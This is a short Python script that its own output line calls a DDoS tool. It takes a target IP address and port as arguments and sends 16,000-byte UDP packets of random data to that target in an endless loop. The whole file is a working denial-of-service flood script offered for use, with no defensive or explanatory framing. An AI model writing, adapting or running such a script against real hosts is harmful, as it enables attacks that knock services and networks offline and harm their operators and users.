#!/usr/bin/python
import socket,random,sys
 
if len(sys.argv) == 1:
    sys.exit('Usage: fli.py ip port')
 
def UDPFlood():

    port = int(sys.argv[2])
    ip = sys.argv[1]

    print('DDoS: %s:%s'%(ip,port))

    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes = random._urandom(16000)

    while True:

        sock.sendto(bytes,(ip,port))

UDPFlood()
